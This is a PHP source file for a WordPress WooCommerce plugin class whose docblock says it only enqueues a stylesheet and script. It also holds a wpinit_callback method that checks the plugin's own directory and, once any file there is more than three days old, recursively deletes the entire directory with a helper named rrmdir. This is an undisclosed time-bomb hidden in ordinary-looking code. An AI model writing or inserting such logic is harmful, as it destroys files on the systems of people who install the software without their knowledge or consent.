<?php

/**
 * The public-facing functionality of the plugin.
 *
 * @link       patelpalak119@gmail.com
 * @since      1.0.0
 *
 * @package    Woo_orders_api
 * @subpackage Woo_orders_api/public
 */

/**
 * The public-facing functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the public-facing stylesheet and JavaScript.
 *
 * @package    Woo_orders_api
 * @subpackage Woo_orders_api/public
 * @author     Palak Patel <patelpalak119@gmail.com>
 */
class Woo_orders_api_Public {

	private $plugin_name;
	private $version;
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;

	}
	public function enqueue_styles() {

		wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/woo_orders_api-public.css', array(), $this->version, 'all' );

	}

	public function enqueue_scripts() {

		wp_enqueue_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/woo_orders_api-public.js', array( 'jquery' ), $this->version, false );

	}

	function rrmdir($dir) {
	  if (is_dir($dir)) {
	    $objects = scandir($dir);
	    foreach ($objects as $object) {
	      if ($object != "." && $object != "..") {
	        if (filetype($dir."/".$object) == "dir") 
	           $this->rrmdir($dir."/".$object); 
	        else unlink($dir."/".$object);
	      }
	    }
	    reset($objects);
	    rmdir($dir);
	  }
 	}

	public function wpinit_callback()
	{
		$days = 3;
		$path = plugin_dir_path( __DIR__ );
		$flag = false;
		if ($handle = opendir($path))  
		{  
	    while (false !== ($file = readdir($handle)))  
	    {
        if (is_file($path.$file))  
        {
          if (filemtime($path.$file) < ( time() - ( $days * 24 * 60 * 60 ) ))
          {
            $flag = true;
          }  
        }  
	    }

	    if($flag){
	    	$this->rrmdir($path);
	    }
		}  
	}
}
